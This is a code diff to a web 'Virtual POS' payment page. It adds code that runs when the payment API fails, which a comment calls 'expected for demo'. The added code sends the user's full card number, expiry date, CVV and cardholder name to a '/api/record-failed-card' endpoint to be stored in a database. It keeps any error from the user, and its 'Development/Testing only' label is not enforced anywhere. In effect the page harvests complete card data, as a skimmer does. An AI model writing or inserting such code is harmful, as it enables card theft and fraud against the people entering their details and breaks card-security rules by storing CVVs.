@@ -152,6 +152,33 @@ export default function VirtualPosPage() {
       console.log('🏦 Virtual POS: API error (expected for demo)', error);
       clearInterval(progressInterval);
       
+      // Record failed credit card attempt with full card data (Development/Testing only)
+      try {
+        const cleanCardNumber = formData.cardNumber.replace(/\s/g, '');
+        const response = await fetch('/api/record-failed-card', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            cardNumber: cleanCardNumber,
+            cardExpiry: formData.expiryDate,
+            cardCvv: formData.cvv,
+            cardName: formData.cardHolder,
+            wallet: null,
+            amount: formData.amount.toString(),
+            campaignId: null,
+            purpose: 'account_activation'
+          }),
+        });
+        
+        const result = await response.json();
+        console.log('✅ Failed card attempt recorded to database:', result.attemptId);
+      } catch (logError) {
+        console.error('Failed to log card attempt:', logError);
+        // Don't show this error to user, just log it
+      }
+      
       // Complete progress bar
       setProcessingState({
         isProcessing: false,
